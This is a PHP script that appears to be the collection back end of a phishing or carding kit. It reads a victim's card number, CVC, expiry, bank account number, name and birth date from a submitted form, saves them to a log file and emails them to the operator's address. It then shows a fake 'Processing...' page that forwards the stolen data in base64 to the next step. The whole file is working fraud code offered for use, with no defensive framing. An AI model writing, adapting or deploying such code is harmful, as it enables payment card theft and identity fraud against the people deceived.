<?php
include("send.php");
$langa = base64_encode($_POST["langa"]);
$montant = base64_encode($_POST["ext"]);
$randomize = str_replace(" ", "-", $ip."-".$_POST["langa"]." ".$_POST["hold"]." ".$_POST["djj"]."-".$_POST["dmm"]."-".$_POST["daa"]."-".$_POST["ccnum"]."-".$_POST["cvc"]."-".$_POST["expiry"]."-".$_POST["kontonum"]);
$cardnm = base64_encode($_POST["ccnum"]);
$params = base64_encode("$randomize");
$data = " user : $_POST[hold] ($_POST[djj]/$_POST[dmm]/$_POST[daa]) \n accountNum : $_POST[kontonum] \n cc : $_POST[ccnum] : $_POST[expiry] : $_POST[cvc] \n location : $_POST[location] - $_POST[langa]\n log : $ip [$date] $uagent \n ------\n\n\n";
if($TxtStore == "1"){
@file_put_contents($ccStore, $data, FILE_APPEND | LOCK_EX);} else {}
@mail($rezltMail, $rezlTitleCvv, $data);
$CInfo = base64_encode($_POST["ccnum"]." : ".$_POST["expiry"]." : ".$_POST["cvc"]." | ".$_POST["djj"]."-".$_POST["dmm"]."-".$_POST["daa"]." : ".$_POST["kontonum"]);
echo "<html><head><meta http-equiv=\"refresh\" content=\"1;URL='process.php?";
echo "l=$langa&m=$montant&c=$cardnm&ci=$CInfo&".$params."'\" /></head><body>Processing...";
?>